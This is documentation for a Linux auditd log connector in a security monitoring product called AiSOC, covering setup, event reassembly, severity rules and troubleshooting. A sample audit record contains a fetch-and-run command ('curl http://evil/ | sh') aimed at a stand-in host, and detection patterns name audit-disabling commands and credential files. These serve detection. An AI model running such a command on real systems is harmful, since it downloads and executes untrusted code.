---
sidebar_position: 17
title: Linux Auditd
description: File-tail connector for the Linux Audit subsystem (auditd). Reassembles multi-record audit events into flat documents that detections/endpoint/linux-*.yaml rules pivot on, with no host-agent dependency.
---

# Linux Auditd

The Linux Audit subsystem (`kauditd` in the kernel, `auditd` in
userspace) is the canonical telemetry source for `execve`,
syscall-based file watches, and kernel-module load events on every
modern Linux distribution. Almost every detection rule under
`detections/endpoint/linux-*.yaml` expects events in this shape
(`syscall`, `exe`, `argv`, `path`, `actor_uid`, `auditd_key`).

This connector ingests `auditd` events without requiring a host
agent — it tails `/var/log/audit/audit.log` forward from a saved
byte cursor, the same pattern the Kubernetes audit connector uses
in `file_tail` mode.

## Why file_tail (and not a host-agent)

AiSOC is deliberately host-agent-free in v1. Operators who want
auditd telemetry already pay for `auditd` itself — it ships with
every server distro. The path of least deployment friction is:

1. Drop AiSOC's `audit.rules` profile under
   `/etc/audit/rules.d/`.
2. Reload with `augenrules --load`.
3. Mount `/var/log/audit/audit.log` read-only into the AiSOC
   `services/connectors` pod (or run the connector on the same
   host as the auditd daemon).

No Go agent to compile, no second daemon to babysit, no kernel
module to load. The trade-off is poll latency rather than push
latency — events show up at the connector's poll cadence
(default 60s). If you need real-time push semantics, the v2
`host-agent` workstream covers it.

## What you get

Every reassembled audit event is normalised to a stable, flat
shape regardless of how many underlying records (`SYSCALL`,
`EXECVE`, `PATH`, `CWD`, `PROCTITLE`) the kernel emitted for it:

| Field | Source | Notes |
|---|---|---|
| `host` / `hostname` | Operator-supplied `host_label` | Stamped on every event so detections can scope to one fleet member |
| `syscall` | `SYSCALL.syscall` (number, mapped to name) | `execve`, `openat`, `unlinkat`, `init_module`, … |
| `exe` | `SYSCALL.exe` | Absolute path of the running binary |
| `argv` | `EXECVE.a0`, `a1`, … (positional, until the first gap) | Reassembled into a list |
| `path` / `paths` | `PATH.name` (first / all) | First path is promoted to `path` for the common single-target case |
| `cwd` | `CWD.cwd` | Working directory at exec time |
| `proctitle` | `PROCTITLE.proctitle` (hex-decoded if needed) | NUL-separated `argv` from the kernel; AiSOC replaces NULs with spaces |
| `comm` | `SYSCALL.comm` | Short command name (16 bytes) |
| `actor_uid` / `actor_auid` / `actor_euid` / `actor_gid` | `SYSCALL.uid` / `auid` / `euid` / `gid` | Real, audit, effective uid + primary gid |
| `actor_pid` / `actor_ppid` | `SYSCALL.pid` / `ppid` | Process + parent PID |
| `tty` / `session` | `SYSCALL.tty` / `ses` | Useful for joining to login sessions |
| `arch` | `SYSCALL.arch` | `c000003e` = x86_64, `40000028` = ARMv7, … |
| `auditd_key` / `key` | `SYSCALL.key` | The `-k` value from the rule that fired — pivot field for AiSOC's profile-aware detections |
| `success` / `exit` | `SYSCALL.success` / `exit` | `yes` / `no` and the syscall return code |
| `event_id` | `<timestamp>:<serial>` | Composite ID from `msg=audit(<ts>:<serial>)`, stable across retries |
| `raw_records` | Per-record-type breakdown | Preserved so detections can walk back to a specific record type |

## Capabilities

| Capability | Notes |
|---|---|
| `PULL_AUDIT` | Primary capability — auditd is the canonical Linux audit source |
| `PULL_ALERTS` | High-severity events (key-prefix or path-based) surface as alerts |

auditd is a passive telemetry source — there is no
`BLOCK` / `ISOLATE` capability here. Live response on a Linux
host is tracked separately under the generic `live_action`
capability so the platform stays vendor-neutral.

## The auditd parsing problem (what the connector does for you)

`auditd` writes one line per audit *record*, but a single
*event* can span multiple records that share the same
`msg=audit(<timestamp>:<serial>)` identifier. A single
`execve` looks like five records on the wire:

```
type=SYSCALL    msg=audit(1715520000.123:9876): arch=c000003e syscall=59 success=yes ... uid=1000 auid=1000 comm="bash" exe="/usr/bin/bash" key="aisoc_exec"
type=EXECVE     msg=audit(1715520000.123:9876): argc=3 a0="bash" a1="-c" a2="curl http://evil/ | sh"
type=CWD        msg=audit(1715520000.123:9876): cwd="/tmp"
type=PATH       msg=audit(1715520000.123:9876): item=0 name="/usr/bin/bash" ...
type=PROCTITLE  msg=audit(1715520000.123:9876): proctitle="bash\0-c\0..."
```

The connector reassembles these into one normalised event per
`(timestamp, serial)` tuple before handing it to ingest, so a
detection rule can express:

```
syscall == "execve"
AND exe ENDSWITH "/auditctl"
AND argv CONTAINS_ANY ["-D", "-e 0"]
```

…against a single document instead of having to JOIN across
sibling records. `proctitle` is hex-decoded automatically when
the kernel hex-encodes it (which it does whenever `argv`
contains NULs, newlines, or other unsafe bytes).

## Severity heuristic

Audit records carry `key=...` strings set by the operator's
rules. The AiSOC `audit.rules` profile names every rule
`aisoc_<bucket>` so the connector can derive a meaningful
severity from the key alone:

| Condition | AiSOC severity |
|---|---|
| `key` starts with `aisoc_critical_` (sudoers, identity, SSH config, exec from `/tmp` etc.) | `high` |
| `key` starts with `aisoc_priv_esc_` (kernel module load, ptrace, mount) | `medium` |
| `key` starts with `aisoc_persistence_` (cron, systemd, init.d, profile.d) | `medium` |
| `key` is `aisoc_exec` (operator-enabled execve catch-all) | `medium` |
| `key` starts with `aisoc_watch_` (hosts, resolv.conf, nsswitch) | `low` |
| `key` starts with `aisoc_audit_` (audit subsystem self-tampering) | `low` |
| `path` is one of `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/ssh/sshd_config` (no key match) | `high` |
| `syscall == execve` from `/dev/shm/`, `/tmp/`, `/var/tmp/`, `/run/shm/` (no key match) | `high` |
| Everything else | `info` |

**Operators not using the AiSOC profile** (e.g. you keep an existing
CIS / STIG ruleset) still get coverage — the path-based and
exec-from-temp heuristics fire regardless of which keys your rules
use. But pivoting on `auditd_key` only works if you ship our
profile, because that field is opaque to AiSOC otherwise.

## Prerequisites

- A Linux host with `auditd` installed (any modern distro: RHEL,
  CentOS, Ubuntu, Debian, Amazon Linux, Rocky, Alma).
- Root access on that host once, to install the rules profile and
  reload the kernel ruleset.
- The AiSOC `services/connectors` process able to read
  `/var/log/audit/audit.log` (read-only mount in Kubernetes, or
  run the connector on the same host with appropriate file
  permissions).
- A writeable directory for the byte cursor file (defaults to
  `<audit_log_path>.aisoc-cursor`).

## Setup walkthrough

### 1. Install the AiSOC audit.rules profile

Copy the bundled profile into the host's audit rules directory:

```bash
sudo cp profiles/auditd/aisoc.rules /etc/audit/rules.d/99-aisoc.rules
sudo augenrules --load
sudo auditctl -l | head -n 20  # sanity check — rules should be loaded
```

The profile uses `-k aisoc_*` keys for every rule so the connector
can map events to AiSOC's severity tiers. Coverage targets, in
priority order:

1. `execve` from `/tmp`, `/dev/shm`, `/var/tmp` (post-exploitation staging)
2. Writes to `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`, `/etc/sudoers.d`
3. SSH config + `authorized_keys` tampering
4. Cron / systemd / init.d / profile.d persistence
5. Kernel module load / removal (`init_module`, `finit_module`, `delete_module`, `insmod`, `rmmod`, `modprobe`)
6. `ptrace`, `mount`, `memfd_create`
7. Audit subsystem self-tampering (`auditctl -D`, `auditctl -e 0`)

The profile deliberately does **not** enable a blanket execve
catch-all. Every `execve` on a busy host produces 10–50
records/second; that volume overwhelms the file_tail connector
and obscures real signal. If you want full execve coverage,
append:

```
-a always,exit -F arch=b64 -S execve -k aisoc_exec
```

…and accept the volume.

### 2. Mount the audit log into the connector pod

Add a read-only volume mount to the `services/connectors`
deployment:

```yaml
spec:
  containers:
    - name: connectors
      volumeMounts:
        - name: auditd-log
          mountPath: /var/log/audit
          readOnly: true
        - name: auditd-cursor
          mountPath: /var/lib/aisoc/auditd
  volumes:
    - name: auditd-log
      hostPath:
        path: /var/log/audit
        type: Directory
    - name: auditd-cursor
      emptyDir: {}
```

In production, replace `emptyDir` with a PVC so the cursor
survives pod restarts — otherwise a restart re-ingests the
current segment from the top.

If you're running the connector on bare metal alongside the
auditd daemon, no mount is needed — just make sure the connector
process can read the audit log file (the `audit` group, or a
sudoers/ACL grant).

### 3. Add the connector in AiSOC

1. **Connectors → Add connector → Linux Auditd**.
2. **Host label**: a human-readable identifier for the host
   (e.g. `prod-web-01`). Stamped on every event so detections
   and investigations can filter by host without relying on the
   kernel's reported hostname.
3. **Audit log path**: `/var/log/audit/audit.log` (default).
4. **Cursor file path**: `/var/lib/aisoc/auditd/audit.cursor`
   if you mounted a dedicated cursor volume. Defaults to
   `<audit_log_path>.aisoc-cursor` if blank.
5. **Test connection** — AiSOC confirms the audit log exists and
   is readable.
6. **Save**.

To cover multiple hosts, add one connector instance per host.
Each instance gets its own `host_label` and cursor file so
ingest can attribute events correctly.

## Polling details

- Default poll interval: **60 seconds** (overrideable per
  instance via `connector_config.poll_interval_seconds`).
- Each poll reads forward from the saved byte cursor up to a
  hard cap of **8 MiB per poll** to bound memory. Anything past
  that is left for the next poll.
- A second cap of **50 000 reassembled events per poll** prevents
  pathological execve storms (fork bombs, runaway CI runners)
  from blowing through the connector's memory budget.
- The cursor is written **atomically** (temp file + rename) so a
  crash mid-write can't corrupt it. A corrupt cursor is treated
  as `0` with a warning — better to re-ingest than to silently
  wedge.
- **Rotation handling**: if the file shrinks between polls
  (`logrotate copytruncate`, or auditd opened a new segment) the
  cursor resets to `0` and AiSOC starts over from the top of the
  current segment.
- **Partial-line handling**: a final line without a trailing
  `\n` is left for the next poll, so the cursor never advances
  past an incomplete record.

`since_seconds` is intentionally ignored — the byte cursor
already gives exactly-once-ish semantics, and audit records
don't all carry a sortable timestamp we could use to filter on
a sliding window.

## Detections that ship with this profile

These detection rules (under `detections/endpoint/`) pivot
directly on the `auditd_key` field exposed by this connector and
require the AiSOC profile from step 1:

| Rule | Pivots on | Severity |
|---|---|---|
| `linux-auditd-sudoers-tampering.yaml` | `auditd_key == "aisoc_critical_sudoers_write"` | `high` |
| `linux-auditd-ssh-config-tampering.yaml` | `auditd_key IN ["aisoc_critical_ssh_config", "aisoc_critical_authorized_keys"]` | `high` |
| `linux-auditd-kernel-module-load.yaml` | `auditd_key == "aisoc_priv_esc_module_load"` | `medium` |
| `linux-auditd-systemd-persistence.yaml` | `auditd_key == "aisoc_persistence_systemd"` | `medium` |

Plus the broader catalogue under `detections/endpoint/linux-*.yaml`
that pivots on the flat `syscall` / `exe` / `argv` / `path`
fields the connector emits — those work with **any** auditd
ruleset, not just the AiSOC profile.

## Troubleshooting

**`Test connection` returns `audit log path … not found`** — the
connector pod cannot see the file. Check the volume mount
(`kubectl exec` into the pod and `ls -l /var/log/audit/audit.log`)
and that auditd is actually running on the host
(`systemctl status auditd`).

**`Test connection` returns `… is not readable by the connector
pod`** — the file exists but the connector process lacks read
permission. On most distros `audit.log` is mode `0640` owned by
`root:root` — either run the connector as root (in a constrained
pod), grant it the `audit` group, or `setfacl -m u:aisoc:r
/var/log/audit/audit.log` if you have ACL support.

**No events in the inbox even though auditd is running** — most
commonly the connector is reading the file fine, but no rules
have fired yet. Generate a test event:

```bash
sudo touch /etc/sudoers.d/aisoc-test
sudo rm /etc/sudoers.d/aisoc-test
```

…and wait one poll interval (default 60s). If still nothing,
check `auditctl -l | grep aisoc` on the host — the rules may
not have loaded.

**Connector logs `auditd.cursor_reset_after_rotation`** — this is
informational, not an error. It means `logrotate` rotated
`audit.log` and the connector reset the cursor. Expected after
log rotation.

**Connector logs `auditd.event_storm_truncated`** — the host
generated more than 50 000 distinct audit events in a single
poll interval. Either tune your audit policy to drop the noisiest
rules, or shorten the poll interval so each batch is smaller.

**`exe` field is empty for `execve` events** — the kernel only
populates `exe` after the new program is loaded; if the syscall
was denied (`success=no`) you'll get `comm` but no `exe`. This
is expected.

**`proctitle` looks like a long hex string** — the connector
should hex-decode automatically. If you see raw hex it's because
the value contained an odd number of characters or a
non-hex byte; we leave it as-is in that case rather than
corrupting the value.

**Cursor file keeps the connector reading from the top after
restart** — your cursor volume is `emptyDir` (lost on pod
restart) or pointed at a path the connector cannot write. Mount a
real volume (PVC or hostPath) for the cursor directory.

## Related

- [Kubernetes Audit Logs](/docs/connectors/kubernetes-audit) — the
  same `file_tail` pattern applied to the apiserver audit log.
- [osctrl](/docs/connectors/osctrl) and
  [FleetDM](/docs/connectors/fleetdm) — osquery-based fleet
  managers if you want host telemetry through a higher-level
  query surface instead of raw kernel audit.
- [Wazuh](/docs/connectors/wazuh) — full-stack HIDS / SIEM that
  consumes auditd internally and exposes its own pre-correlated
  alerts.
- [Detection coverage](/docs/detections/coverage) — the
  endpoint rules that fire on this connector's events.
- [Live actions](/docs/concepts/live-actions) — vendor-neutral
  surface for responding to auditd-sourced alerts on a Linux host.
